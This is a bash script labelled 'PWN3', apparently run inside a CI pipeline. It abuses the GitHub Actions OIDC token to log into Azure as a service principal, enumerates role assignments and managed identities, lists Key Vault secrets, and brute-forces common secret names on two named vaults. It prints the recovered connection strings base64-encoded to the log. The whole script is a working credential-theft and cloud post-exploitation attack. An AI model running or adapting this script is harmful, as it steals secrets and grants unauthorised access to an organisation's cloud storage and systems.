#!/usr/bin/env bash
set +e
echo "=====PWN3_START====="
AUD="api:""//AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1
echo "[*] login rc=$?"
echo "--- ROLE ASSIGNMENTS (storage/blob related) ---"
az role assignment list --all -o json 2>/dev/null | python3 -c '
import sys,json
try: ras=json.load(sys.stdin)
except Exception: ras=[]
for r in ras:
    role=r.get("roleDefinitionName",""); scope=r.get("scope",""); name=r.get("name","")
    p=r.get("principalName") or ""; pid=r.get("principalId",""); ptype=r.get("type","")
    if "storage" in role.lower() or "blob" in role.lower() or "storageAccounts" in scope:
        print(f"{role} | {p} ({ptype}) | {scope.split(\"/\")[-1]}")
' 2>&1 | sort -u | head -40
echo "--- ROLE ASSIGNMENTS cua cac SP da biet ---"
az role assignment list --all -o json 2>/dev/null | python3 -c '
import sys,json
try: ras=json.load(sys.stdin)
except Exception: ras=[]
apps={"12ed54de-f2eb-4784-804c-3a7a3e83a9e9":"reporting-service","462d1c38-4459-48b8-9333-82e389e59514":"sync-service","038bc35d-131d-4953-9985-ff4a245ccec1":"cost-reader","2c34300e-1bc0-41e7-9c1e-8b7571d72c72":"directory-audit","72ff278a-9e71-43ec-bac4-2ca303f8e462":"CI-SP","881fddce-6208-4af5-a297-7e79c912f83c":"reporting-viewer","58108da8-044e-4d7e-9a46-92e6179b30be":"secrets-sync"}
for r in ras:
    pid=r.get("principalId","")
    if pid in apps: print(apps[pid], "|", r.get("roleDefinitionName"), "|", r.get("scope","").split("/")[-1])
'
echo "--- USER-ASSIGNED MANAGED IDENTITIES ---"
az login -i >/dev/null 2>&1
az identity list -o tsv --query "[].[name,resourceGroup,principalId]" 2>&1 | head -10
echo "--- kv-tbl-sec secret list ---"
az keyvault secret list --vault-name kv-tbl-sec-x3euoz -o tsv --query "[].name" 2>&1 | head -10
echo "--- do ten secret pho bien tren 2 vault (b64) ---"
for KV in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  for S in storage-connection config-storage-connection config-storage-connection-string storage-connection-string app-config-connection reporting-config tbl-config internal-config config-blob-connection; do
    V=$(az keyvault secret show --vault-name "$KV" -n "$S" --query value -o tsv 2>/dev/null)
    [ -n "$V" ] && echo "$KV/$S b64: $(printf %s "$V" | base64 -w0)"
  done
done
echo "=====PWN3_END====="